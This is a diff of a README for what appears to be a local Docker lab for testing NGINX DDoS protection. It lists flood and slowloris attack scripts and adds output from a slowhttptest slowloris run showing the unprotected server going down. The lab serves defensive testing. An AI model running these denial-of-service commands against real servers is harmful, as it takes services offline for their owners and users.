@@ -28,14 +28,14 @@ docker-compose run attacker bash
 ```
 
 **Tools:**
-- http-flood.sh - ***HTTP Flood***
-- icmp-flood.sh - ***ICMP Flood***
-- ping-of-death.sh - ***Ping of Daeth***
-- set-backend.sh - ***Setting target as unprotected NGINX server***
-- set-defender.sh - ***Setting target as protected NGINX server***
-- slowloris.sh - ***Slowloris***
-- syn-flood.sh - ***SYN Flood***
-- udp-flood.sh - ***UDP Flood***
+- http-flood.sh - *HTTP Flood*
+- icmp-flood.sh - *ICMP Flood*
+- ping-of-death.sh - *Ping of Daeth*
+- set-backend.sh - *Setting target as __unprotected__ NGINX server*
+- set-defender.sh - *Setting target as __protected__ NGINX server*
+- slowloris.sh - *Slowloris*
+- syn-flood.sh - *SYN Flood*
+- udp-flood.sh - *UDP Flood*
 
 
 ## Testing
@@ -43,6 +43,31 @@ docker-compose run attacker bash
 ### Slowloris
 ```
 slowhttptest -c 2000 -H -g -o slowhttp -i 10 -r 200 -t GET -u ${TARGET_URL} -x 24 -p 3
+```
+
+Attack on NGINX server with DDoS protection **enabled**:
+```
+initializing:        0
+pending:             0
+connected:           571
+error:               0
+closed:              1429
+service available:   YES
+```
+
+Attack on NGINX server with DDoS protection **disabled**:
+```
+initializing:        0
+pending:             0
+connected:           1029
+error:               0
+closed:              971
+service available:   NO
+```
+
+```
+curl -XGET http://localhost:5050
+curl: (52) Empty reply from server
 ```
 
 ### HTTP Flood
